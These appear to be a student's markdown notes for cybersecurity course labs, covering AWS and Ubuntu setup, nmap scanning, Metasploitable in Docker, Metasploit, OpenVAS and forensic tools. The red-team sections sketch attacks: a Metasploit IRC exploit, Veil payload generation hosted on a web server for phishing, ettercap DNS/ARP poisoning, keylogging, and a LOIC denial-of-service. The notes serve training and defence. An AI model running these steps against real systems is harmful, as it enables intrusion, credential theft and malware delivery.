# Cyber Labs

## contents

- [Cyber Labs](#cyber-labs)
  - [contents](#contents)
  - [Steghide](#steghide)
    - [Vulnversity](#vulnversity)
  - [Cyber Labs on AWS](#cyber-labs-on-aws)
    - [AWS Linux Virtual Machine](#aws-linux-virtual-machine)
      - [Build A New Instance (T2 Large)](#build-a-new-instance-t2-large)
      - [Connect](#connect)
    - [AWS Linux Install Apache](#aws-linux-install-apache)
    - [AWS Linux Install Mongo](#aws-linux-install-mongo)
    - [AWS Build Ubuntu](#aws-build-ubuntu)
    - [AWS Upgrade Ubuntu To Latest](#aws-upgrade-ubuntu-to-latest)
    - [AWS Ubuntu via CLI](#aws-ubuntu-via-cli)
    - [Ubuntu Install Apache](#ubuntu-install-apache)
    - [Ubuntu Install NGINX](#ubuntu-install-nginx)
    - [Ubuntu Install python](#ubuntu-install-python)
    - [Ubuntu install nmap (1 minute install)](#ubuntu-install-nmap-1-minute-install)
    - [Ubuntu Install Docker](#ubuntu-install-docker)
    - [Docker Install Metasploitable](#docker-install-metasploitable)
    - [NMap Scan Metasploitable](#nmap-scan-metasploitable)
    - [Ubuntu Install Metasploit Part I](#ubuntu-install-metasploit-part-i)
    - [install metasploit (Part II)](#install-metasploit-part-ii)
    - [Ubuntu Install MongoDB](#ubuntu-install-mongodb)
      - [start mongodb](#start-mongodb)
      - [run mongo client](#run-mongo-client)
    - [AWS Kali with VNC](#aws-kali-with-vnc)
    - [Kali Install OpenVAS  (1 hour with attended input)](#kali-install-openvas--1-hour-with-attended-input)
    - [Ubuntu Install Docker](#ubuntu-install-docker-1)
    - [Docker Install Metasploitable](#docker-install-metasploitable-1)
      - [Run an exploit](#run-an-exploit)
    - [AWS Run Container](#aws-run-container)
  - [Kali](#kali)
    - [Kali Handbook](#kali-handbook)
    - [About Kali](#about-kali)
    - [Installing Kali](#installing-kali)
  - [Docker Kali](#docker-kali)
  - [Penetration](#penetration)
  - [Metasploit](#metasploit)
    - [What is Metasploit?](#what-is-metasploit)
  - [Metasploitable](#metasploitable)
  - [intro](#intro)
    - [Windows VMs we can attack](#windows-vms-we-can-attack)
    - [Metasploitable Setup](#metasploitable-setup)
      - [Data Path](#data-path)
      - [Documentation Path](#documentation-path)
      - [Exploit Modules Path](#exploit-modules-path)
      - [Scripts including Meterpreter Path](#scripts-including-meterpreter-path)
  - [Other Cyber Labs](#other-cyber-labs)
    - [NMap](#nmap)
    - [netdiscover](#netdiscover)
    - [dig](#dig)
    - [traceroute](#traceroute)
  - [red tools](#red-tools)
  - [port and host scanning](#port-and-host-scanning)
    - [vulnerability scanners](#vulnerability-scanners)
    - [openvas](#openvas)
    - [armitage = gui for metasploit](#armitage--gui-for-metasploit)
    - [metasploit](#metasploit-1)
    - [zenmap - host and port scan](#zenmap---host-and-port-scan)
    - [nikto - web server vulnerability scanner](#nikto---web-server-vulnerability-scanner)
    - [mbsa - windows server scanner](#mbsa---windows-server-scanner)
  - [ids](#ids)
    - [securityonion ids](#securityonion-ids)
    - [sguil ids](#sguil-ids)
    - [sgutil ids](#sgutil-ids)
  - [sysinternals suite of tools from microsoft](#sysinternals-suite-of-tools-from-microsoft)
    - [autoruns - what is set to auto start](#autoruns---what-is-set-to-auto-start)
    - [accesschk - search for unauthorised privileges](#accesschk---search-for-unauthorised-privileges)
    - [accessenum - enumerate access?](#accessenum---enumerate-access)
    - [du disk usage](#du-disk-usage)
    - [sigcheck - verify root certificate](#sigcheck---verify-root-certificate)
  - [cyber tools](#cyber-tools)
    - [veil](#veil)
    - [evasion](#evasion)
    - [pcap](#pcap)
    - [networkminer.exe](#networkminerexe)
    - [sysmon](#sysmon)
    - [pcap](#pcap-1)
    - [ossim](#ossim)
  - [Forensic Labs](#forensic-labs)
    - [CyberChef](#cyberchef)
    - [autopsy](#autopsy)
    - [Lab 11](#lab-11)
    - [Lab 12 : Network Segmentation : PFSense](#lab-12--network-segmentation--pfsense)
    - [Lab 12 : install backdoor malware](#lab-12--install-backdoor-malware)
    - [Lab 13 : Password sniffing](#lab-13--password-sniffing)
    - [Lab 14 : Using email to hack](#lab-14--using-email-to-hack)
    - [Lab 14 : Exploiting XSS with MITM attack](#lab-14--exploiting-xss-with-mitm-attack)


## Steghide

```bash
# install
sudo apt-get install steghide
# does a file have embedded data
steghide info file
# extract embedded data from a file
steghide extract -sf file
```

### Vulnversity

https://tryhackme.com/room/vulnversity

```bash
# service discovery - scan for open ports
nmap 1.2.3.4
nmap domain.com
# scan version
nmap -sV 
# scan all ports
nmap -p- 
# scan first 400 ports
nmap -p-400  
# os and version *** use this one!
nmap -A 
# lots of info but not as much as A
nmap -sC
# verbose but not as good as A 
nmap -v  
# scan UDP (no response)
nmap -sU
# scan TCP SYN
nmap -sS
# don't resolve dns
nmap -n 1.2.3.4
# gobuster to brute force attack directories on a web server
sudo apt install gobuster
# find word lists
cd /usr/share/wordlists/dirbuster
# run gobuster
gobuster dir -u http://10.10.196.4:3333 -w directory-list-2.3-medium.txt

```


## Cyber Labs on AWS

### AWS Linux Virtual Machine

#### Build A New Instance (T2 Large)

#### Connect

1. Save the key in .ssh hidden folder in the user profile

2. Change permissions on file to read only
     a) Disable inheritance
     b) Remove excess users
     c) Set admin to read only
 
2. Connect using
      
```bash
ssh -i ~/.ssh/AWSLinuxKeyPair.pem ec2-user@34.242.114.92
```


### AWS Linux Install Apache

Add in User Data secion of startup script

```bash
#!/bin/bash
yum update -y
amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2
yum install -y httpd mariadb-server
systemctl start httpd
systemctl enable httpd
usermod -a -G apache ec2-user
chown -R ec2-user:apache /var/www
chmod 2775 /var/www
find /var/www -type d -exec chmod 2775 {} \;
find /var/www -type f -exec chmod 0664 {} \;
echo "<?php phpinfo(); ?>" > /var/www/html/phpinfo.php
touch /var/www/html/index.html
echo "<html>hello world from phil</html>" > /var/www/html/index.html
```

Unblock port 80 using EC2 > Security Groups > <<Group>> > Change rule and add port 80

Go to <<Public IP>> and you should now have a web server!!!


### AWS Linux Install Mongo

```bash
# check which version of linux we are using
grep ^NAME  /etc/*release
# create environment
sudo touch /etc/yum.repos.d/mongodb-org-4.2.repo 
sudo chmod 777 mongodb-org-4.2.repo
sudo echo [mongodb-org-4.2] >> /etc/yum.repos.d/mongodb-org-4.2.repo 
sudo echo name=MongoDB Repository >> /etc/yum.repos.d/mongodb-org-4.2.repo 
sudo echo baseurl=https://repo.mongodb.org/yum/amazon/2/mongodb-org/4.2/x86_64/ >> /etc/yum.repos.d/mongodb-org-4.2.repo 
sudo echo gpgcheck=1 >> /etc/yum.repos.d/mongodb-org-4.2.repo 
sudo echo enabled=1 >> /etc/yum.repos.d/mongodb-org-4.2.repo 
sudo echo gpgkey=https://www.mongodb.org/static/pgp/server-4.2.asc >> /etc/yum.repos.d/mongodb-org-4.2.repo 

# install mongo
sudo yum install -y mongodb-org
# check which version we are using
ps --no-headers -o comm 1
# start
sudo systemctl start mongod
# check status
sudo systemctl status mongod
# start when system starts
sudo systemctl enable mongod
# client
mongo
# database
use test-database-01
# show databases
show dbs
# insert data
db.table01.insert({"name":"test name"})
# show databases again
show dbs
# create collection
db.createCollection("table02")
db.table02.insert({"name":"test name"})
# show collections / tables
show collections
# show data
db.table01.find()
db.table02.find()
```


### AWS Build Ubuntu

```bash
# Ubuntu Server
# Key Pair set permissions to read only
Set-ItemProperty -Path ~/.ssh/KaliLinuxKeyPair2.pem -Name IsReadOnly -Value $true
# log in
ssh -i ~/.ssh/KaliLinuxKeyPair2.pem ubuntu@35.178.191.151
# update
sudo apt update -y
sudo apt upgrade -y
sudo apt dist-upgrade -y
```


### AWS Upgrade Ubuntu To Latest

```bash
sudo apt update -y
sudo -E apt-get -qy -o "Dpkg::Options::=--force-confdef" -o "Dpkg::Options::=--force-confold" upgrade
# This should be silent but is not!
sudo -E apt-get -qy -o "Dpkg::Options::=--force-confdef" -o "Dpkg::Options::=--force-confold" dist-upgrade
# reboot
sudo reboot
# move from LTS to regular version
sudo nano /etc/update-manager/release-upgrades
# set Release=normal   (from LTS) to get latest version 
sudo do-release-upgrade -d -f DistUpgradeViewNonInteractive
sudo do-release-upgrade -f DistUpgradeViewNonInteractive
# check version ie 20.10
cat /etc/os-release 
```



### AWS Ubuntu via CLI

Download run and install the `aws cli` installer

```bash
# check install
aws --version

```

### Ubuntu Install Apache

```bash
# update
sudo apt update -y
sudo -E apt-get -qy -o "Dpkg::Options::=--force-confdef" -o "Dpkg::Options::=--force-confold" upgrade
sudo -E apt-get -qy -o "Dpkg::Options::=--force-confdef" -o "Dpkg::Options::=--force-confold" dist-upgrade
# install
sudo apt-get install apache2 -y
# go to web page at http://<IP> to view it!
# modify files - set ownership
# get username eg `ubuntu`
whoami
# get groups 
groups ubuntu
# change owner
sudo chown -R root:ubuntu /var/www
# replace file 
echo "<html>hello world from phil</html>" > /var/www/html/index.html
# status
systemctl status apache2
sudo systemctl stop apache2
```

### Ubuntu Install NGINX

```bash
# install
sudo apt install -y nginx
# check status
systemctl status nginx
# stop apache if running
sudo systemctl stop apache2
# run
sudo systemctl start nginx
# you should be able to see the nginx web page at <IP> on stanard port 80
# stop
sudo systemctl stop nginx
# run at startup
sudo systemctl enable nginx
# do not run at startup
sudo systemctl disable nginx
```

### Ubuntu Install python

```bash
# install
sudo apt install python
# create and run
touch HelloWorld.py
nano HelloWorld.py     
# print("Hello World")
python HelloWorld.py
```

### Ubuntu install nmap (1 minute install)

*1 minute install*

```bash
sudo apt install nmap -y
# verify version
nmap --version
```


### Ubuntu Install Docker

*1 minute install*

```bash
# install
sudo apt install docker.io -y
# run docker
docker
```







### Docker Install Metasploitable 

*Takes about a minute*

```bash
# docker pull peakkk/metasploitable 
sudo docker pull tleemcjr/metasploitable2
sudo docker run -it tleemcjr/metasploitable2
# note we are now inside the container!!!
hostname
ip a  # inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
# on another shell on the Kali host 
ip a # inet 172.31.4.186/20 brd 172.31.15.255 scope global dynamic eth0
ip a # inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
```

### NMap Scan Metasploitable

*Connect on a new shell, leaving the metasploitable shell open*

```
# ping metasploitable from docker host
ping 172.17.0.2 
# os scan
sudo nmap -O 172.17.0.2
# ping scan
sudo nmap -sn 172.17.0.2
# port scan
sudo nmap -Pn 172.17.0.2
# tcp syn scan
sudo nmap -PS 172.17.0.2
# other nmap labs
nmap -sV 
# scan all ports
nmap -p- 
# scan first 400 ports
nmap -p-400  
# os and version *** use this one!
nmap -A 
# lots of info but not as much as A
nmap -sC
# verbose but not as good as A 
nmap -v  
# scan UDP (no response)
nmap -sU
# scan TCP SYN
nmap -sS
# don't resolve dns
nmap -n 1.2.3.4
```






### Ubuntu Install Metasploit Part I

```bash
# scp copy JDK to Ubuntu from local 20 minutes
cd ~/Downloads
# check file is present (get from Java)
ls
# copy
scp -i ~/.ssh/KaliLinuxKeyPair2.pem .\jdk-11.0.7_linux-x64_bin.tar.gz ubuntu@18.132.64.57:/home/ubuntu
# Prepare environment - add repository
sudo add-apt-repository ppa:linuxuprising/java -y
sudo apt update -y
# set config
echo debconf shared/accepted-oracle-license-v1-1 select true | sudo debconf-set-selections
echo debconf shared/accepted-oracle-license-v1-1 seen true | sudo debconf-set-selections
echo oracle-java11-installer shared/accepted-oracle-license-v1-2 select true | sudo /usr/bin/debconf-set-selections 
# reboot
sudo reboot
```


### install metasploit (Part II)

```bash
# log in
ssh -i ~/.ssh/KaliLinuxKeyPair2.pem ubuntu@18.132.64.57
# install java
sudo mkdir -p /var/cache/oracle-jdk11-installer-local/
sudo cp jdk-11.0.7_linux-x64_bin.tar.gz /var/cache/oracle-jdk11-installer-local/
sudo add-apt-repository ppa:linuxuprising/java -y
sudo apt-get update -y
# set config
echo debconf shared/accepted-oracle-license-v1-1 select true | sudo debconf-set-selections
echo debconf shared/accepted-oracle-license-v1-1 seen true | sudo debconf-set-selections
echo oracle-java11-installer shared/accepted-oracle-license-v1-2 select true | sudo /usr/bin/debconf-set-selections 
# install java
sudo apt install default-jre -y
# check version
java --version
# install metasploit
sudo curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
# run metasploit
msfconsole
# was db set up
db_status
```






### Ubuntu Install MongoDB

```bash
sudo apt install gnupg
wget -qO - https://www.mongodb.org/static/pgp/server-4.2.asc | sudo apt-key add -
echo "deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.2 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.2.list
sudo apt-get update
sudo apt-get install -y mongodb-org
echo "mongodb-org hold" | sudo dpkg --set-selections
echo "mongodb-org-server hold" | sudo dpkg --set-selections
echo "mongodb-org-shell hold" | sudo dpkg --set-selections
echo "mongodb-org-mongos hold" | sudo dpkg --set-selections
echo "mongodb-org-tools hold" | sudo dpkg --set-selections
ps --no-headers -o comm 1
```

#### start mongodb

```bash
sudo systemctl start mongod
sudo systemctl status mongod
sudo systemctl enable mongod
```

#### run mongo client

```bash
# run the client
mongo
# database
use test-database-01
# show databases
show dbs
# insert data
db.table01.insert({"name":"test name"})
# show databases again
show dbs
# create collection
db.createCollection("table02")
db.table02.insert({"name":"test name"})
# show collections / tables
show collections
# show data
db.table01.find()
db.table02.find()
```













### AWS Kali with VNC

Find `Kali` on AWS store, run and install T2 Large via EC2

```bash
# connect
ssh -i ~/.ssh/KaliLinuxKeyPair.pem ec2-user@35.176.24.73
# set password
echo -e "kali\nkali" | sudo passwd ec2-user
echo -e "kali\nkali" | sudo passwd kali
# version
cat /etc/os-release
# run nmap
nmap
# run postgresql
sudo service postgresql start
# run metasploit
msfconsole
exit
# tightvnc
tightvncpasswd 
# view only password => NO
# exit aws vm and return to local powershell
exit
# connect via vnc port
ssh -L 5901:localhost:5901 -i ~/.ssh/KaliLinuxKeyPair.pem ec2-user@35.176.24.73
# run vnc server
vncserver
# download vnc viewer from https://www.realvnc.com/en/connect/download/viewer/linux/
# run vnc viewer
# enress `locahost:1`
# enter password and connect!
```




### Kali Install OpenVAS  (1 hour with attended input)

*Does this work on Raw Ubuntu?  Think not.*
*Note: Total time around 1 hour*
*Note: Downloads a lot of data* 
*Note: During install have to a) select `package maintainer` option 
                              b) select `y` option*


```bash
sudo apt update -y
sudo apt upgrade -y
# install openvas (not silent - requires user input)
sudo apt install openvas -y
# download vulnerability feeds (takes a while!)
sudo openvas-setup -y            
# user with 4c9c6ce9-6602-48bc-9212-55d3d0610493
sudo openvasmd --user=admin --new-password=admin
netstat -antp
sudo openvas-start 
openvas-check-setup

# now connect with VNC as other tutorial details
# now open browser to https://localhost:9392
# and log in !
# if you forget your password you can reset it with
sudo openvasmd --user=admin --new-password=admin
```







### Ubuntu Install Docker

*1 minute install*

```bash
# install
sudo apt install docker.io -y
# run docker
docker
# check service status
sudo service docker start
```




### Docker Install Metasploitable 

*Takes about a minute*

```bash
# docker pull peakkk/metasploitable 
sudo docker pull tleemcjr/metasploitable2
sudo docker run -it tleemcjr/metasploitable2
# note we are now inside the container!!!
hostname
ip a  # inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
# on another shell on the Kali host 
ip a # inet 172.31.4.186/20 brd 172.31.15.255 scope global dynamic eth0
ip a # inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
```





#### Run an exploit

```
msfconsole
search unreal
use exploit/unix/irc.......
set rhosts 172.17.0.2
run
```














### AWS Run Container

First thing is to get a container running on AWS

Using the `Elastic Container Registry`

or

`aws fargate`


ECS Elastic Container Service using Fargate

```bash
# Launch a container in EC2
# Launch Instance
# Community AMI
# Tick Ubuntu
# select a ubuntu
```










## Kali

### Kali Handbook

https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf

### About Kali

Create from a conglomeration of offensive security tools

Built on Debian

### Installing Kali

Linux “HOST” Minimal Memory Requirements
  Realistically 2 GB or more
Kali “GUEST” Minimal Memory Requirements
  2gb plus swap 2GB
Metasploitable “GUEST” Minimal Memory Requirements
  512MB





## Docker Kali 

https://github.com/admirito/gvm-containers









## Penetration 

Golden Ticket Pen Test Lab [https://pentestlab.blog/2018/04/09/golden-ticket/](https://pentestlab.blog/2018/04/09/golden-ticket/)




## Metasploit

### What is Metasploit?

metasploit is a red team tool to launch exploit against vulnerability

written in ruby

https://www.offensive-security.com/metasploit-unleashed/introduction/

https://metasploit.com/

https://github.com/rapid7

https://www.offensive-security.com/metasploit-unleashed/



Running Metasploit with `MSFConsole`

       adding -x runs the old MSFCli commands
    
       msfconsole -x "use exploit/multi/samba/usermap_script;\

Running Metasploit with `MSFCli`  (may have been removed)


Getting Help

       If you aren’t entirely sure about what options belong to a particular module, you can append the letter O to the end of the string at whichever point you are stuck.


       msfcli exploit/multi/samba/usermap_script O


MSFConsole Core Commands

       https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

back

       goes back!


       ```ruby
       back
       ```

banner

       displays a banner!
    
       ```ruby
       banner
       ```

Check - if an exploit will work here

color - the output








## Metasploitable

## intro

intentionally vulnerable machine

https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide

never expose - always keep private

### Windows VMs we can attack

Microsoft has made a number of virtual machines available that can be downloaded to test Microsoft Edge and different versions of Internet Explorer. We will be able to use these VMs when working with some of the exploits and tools available in Metasploit. You can download the VMs from the following URL:

https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

The password to your VM is "Passw0rd!"

### Metasploitable Setup

Once you have downloaded the Metasploitable VM, extract the zip file, open up the .vmx file using your VMware product of choice, and power it on. After a brief time, the system will be booted and ready for action. The default login and password is msfadmin:msfadmin

#### Data Path

/usr/share/metasploit-framework/data/

#### Documentation Path

/usr/share/metasploit-framework/documentation/

#### Exploit Modules Path

/usr/share/metasploit-framework/modules/

All modules are Ruby classes but payloads execute at runtime and can be of any language ie they will execute on the host system in the target language

  Exploits use a `payload`     /usr/share/metasploit-framework/modules/exploits/

  Auxiliary have scanners      /usr/share/metasploit-framework/modules/auxiliary/

  Payloads have the code which executes remotely  /usr/share/metasploit-framework/modules/payloads/

  Encoders ensure safe delivery of payload        /usr/share/metasploit-framework/modules/encoders/

#### Scripts including Meterpreter Path

/usr/share/metasploit-framework/scripts/





## Other Cyber Labs




### NMap

// get help
nmap -h

// TCP SYN scan
nmap -sS

// UDP Scan
nmap -sU

nmap -O can detect operating system
nmap -sL = live hosts
nmap -sn = ping scan (also -sP)
nmap -Pn = port scan every IP on subnet
nmap -PS 1.2.3.4-5.6.7.8 TCP SYN service discovery scan
nmap -sS TCP/SYN
nmap -A OS detection


nmap -sS -sU -p ... nmapoutput.xml

zenmap nmapoutput.xml










### netdiscover

netdiscover -h view help

netdiscover -i eth0 -r <<ip range>>







### dig

dig -h

dig [domain.com](http://domain.com/) NS

dig [domain.com](http://domain.com/) AXFR 1.2.3.4





### traceroute

traceroute [google.com](http://google.com/)

## red tools

## port and host scanning

- zenmap

### vulnerability scanners

- openvas 
- metasploit and armitage
- nikto web vulernability scanner
- sploit 
### openvas

openvas-start vulnerability scan

openvas-check-setup

[http://127.0.0.1:9392](http://127.0.0.1:9392/) = greenbone security assistant = openvas GUI output. Perform a network vulnerability scan using this tool.

openvas : check greenbone reports

demo at https://livedemo.greenbone.net/login

service postgresql start : Start database

msfconsole : load Metasploit

load openvas : load OpenVAS vulnerability scanner

openvas_connect ...

openvas_report_list

openvas_format_list

openvas_report_import <<ReportID>>

hosts : show identified hosts

vulns -R 1.2.3.4 show vulnerabilities for a specific host

search | vulns -R 1.2.3.4 search for exploits which target the vulnerabilities exposed on this host

### armitage = gui for metasploit

Armitage is Java GUI for MSF Metasploit

### metasploit

Connect to MetaSploit server

1.2.3.4 => Scan

Hosts => Nmap Scan => Intense Scan <<1.2.3.4>> which runs db_nmap which adds results to the Metasploit database

Attacks => find attack

Check exploits



### zenmap - host and port scan

### nikto - web server vulnerability scanner

nikto -host 1.2.3.4 to see what vulnerabilities exist

nikto -o sploit.htm -host 1.2.3.4 saves output to web page



### mbsa - windows server scanner

MBSA Baseline Security Analyser - run a scan on your server : updates and incorrect configuration

mbsacli command line scan also

Search for any problems identified in the scan. Try and match against any known vulnerabilities (CVE). If so, do you find any active exploits which could target this vulnerability?




## ids

[ids](ids.md)

### securityonion ids

### sguil ids

### sgutil ids


## sysinternals suite of tools from microsoft

### autoruns - what is set to auto start

### accesschk - search for unauthorised privileges

### accessenum - enumerate access?

### du disk usage

### sigcheck - verify root certificate









## cyber tools

### veil

./Veil.py to run the Veil framework

### evasion

info <space> <tab> <tab> evasion <enter>

use evasion

list to view options for GENERATING PAYLOADS TO DEPOSIT ON AN ENEMY MACHINE

compiler options - EXE or within PDF or WORD

Meterpreter larger but includes critical metsrv.dll
shellcode smaller but still have to download metsrv.dll also afterwards anyway

payload type - TCP, HTTP, HTTPS, RHOST, LHOST

Book => RUBY app => created a hacker app ready to download ( a 'payload')

copy = cp classroom-exploit/*.* /var/www/html/ to root of apache site

service apache2 start : starts web server

copy the hacked file to the website also

open application (icedove thunderbird)

send an email using thunderbird

### pcap

analyse saved PCAP files (Wireshark output)

analyse live PCAP streams

### networkminer.exe

send phishing email from KALI LINUX. Click on the phishing link. Download the dodgy attachment 7z.exe to downloads folder

show files downloaded eg email file .eml, html web page, images and the 7z.exe file

can hash each file downloaded also

### sysmon

Sysmon lab

process explorer - live

process monitor - live

sysmon - allows logging of events so that historical tracing through events can be done

msfconsole

      resource ...path-to-file

procexp64 Process Explorer
tcpview
procmon

sysmon
sysmonconfig-export.xml

TCPView : look at process

run backdoor app

event viewer - application logs - ms - windows - sysmon - operational

examine malware in event viewer

analyse malware incidents on

[malwr.com](http://malwr.com/)[virustotal.com](http://virustotal.com/)

eg

malx.docx

### pcap

analyse pcap files and try to tell IP of attacker and victim, and any tools used.

Wireshark analysis

Network Miner analysis

Practice as well analysing some other files downloadable via user Netresec on Network Miner

### ossim

Using SIEM utility called OSSIM

just screen walkthrough - do not install!

Alien Vault is SIEM (gathering data) tool - OSSIM

OSSEC

OSSIM uses OSSEC HIDS agents to prioritise different kinds of events

decoder : sets REGEX expressions for searching

rules : assigns priority to events

.cfg to parse files

.sql to assign priorities, and to name events

Assign priorities to each rule in OSSIM


  Playbook = series of events, which, if true, maps a priority and an event


OSSIM assets in Environment => Assets and Groups


       Can place assets into groups



OSSIM Dashboard


       chart output visually to give a handle on what's happening



OSSIM Analysis

OSSIM Analysis => Security Feed shows live events




## Forensic Labs

### CyberChef

https://gchq.github.io/CyberChef  Convert from binary to hex to base64 etc





### autopsy 

Autopsy Forensic Analysis

Get a vhd file for analysis

Create a hash of it using

certutil -hashfile mydrive.vhd md5 | find /i /v "md5" | find /i /v "certutil" >> sploit_md5_pre.txt

Autopsy => New Case => connect to data source mydrive.vhd

Ingest Modules : Specific Modules performing specific searches

Analyse a disk image

Autopsy => Open Case => ... => Data Sources => marketing.vhd => Hex tab

Look at HEX, Strings on different disk partitions


       Identify 
              MBR
              NTFS
              any other files



Research other forensic tools

1. EnCase Forensic
2. FTK Forensic Toolkit
3. Cellebrite
4. CRU field analysis

### Lab 11

Blue vs Red

Check out UK Cyber Security Challenge for real-world scenarios

Scenario : we play both BLUE and RED teams

Scenario : Bobby Admin is NEW TEMP HIRE
: Network has been compromised with an internal device fitted
as a rogue device on the internal network

Blue team : Monitor Wireshark packets

Red team : have LAPTOP ON INTERNAL NETWORK

       KaliVM
       service postgresql start
       msf ==> command line => run this scan
              ==> db_nmap -T1 -A -D <<IP range>>         

Blue team : can we spot that a scan is taking place???

       ((Possibly not if the scan is a 'slow' scan))

Red : INTENSE SCAN using Armitage MSF GUI

Blue team : can we spot an attack now?

Blue team : incident response?

       Playbook would guide person what to do



Red team : change IP

Red team : set up website on Linux Apache


   cd Veil
       
       ./Veil.py
       
       use evasion
       
       use 5
       
       set lhost 1.2.3.4
       
       generate
       
       create and copy the malware to your website



red team : hack into dns and update dns with a fake record to the fake site with ettercap

red team : also hack into arp cache using ettercap

blue team : monitor wireshark

blue : go to phishing website

red : Ettercap : Mitm => stop MiTM attack

red : msfconsole


       note : red team has been lured into a honeypot here so blue team can monitor



blue : wireshark capture

blue : process explorer

blue : run the 7z (hacking) process

blue : check process explorer for 7z process

red : hack into onedrive and try and hide malware within onedrive

red : keyscan_start to monitor keystrokes

red : break into honeypot ....

### Lab 12 : Network Segmentation : PFSense

VyOS router : replace with Netgate pfSense which is open source UTM tool

Use diagnostic => mtr to verify routes

blue - log packets from the firewall rules

blue - configure firewall rules

blue - configure suricata alerts on the firewall

red : nmap nmap - topology discovery scan - intense scan

red : nikto vulnerability scan

red : LOIC (Low Orbit Ion Cannon) DOS attack

### Lab 12 : install backdoor malware

Red : Metasploit : install backdoor vulnerability

Blue : check firewall logs

### Lab 13 : Password sniffing

Red : Ettercap : G : Unified Sniffing : Scan for hosts

Red : Ettercap : MITM Poisoning

Red : Wireshark capture

Blue : log onto website with credentials

Red : Try and view password

Blue : create a domain certificate to protect the password

Blue : turn on https for the website

Blue : install RADIUS server

Blue : install RADIUS client

### Lab 14 : Using email to hack

red : create malware using Veil and evasion

red : set up email as a relay (open relay = do not do this in real life)

red : configure email on Thunderbird



### Lab 14 : Exploiting XSS with MITM attack

Use BeEF Browser Exploitation Framework (user=beef password=beef) to configure IE with a proxy address so that web requests get sent to this proxy instead of to the internet, before going to the internet, so that this BeEF can now attempt to run a MITM attack
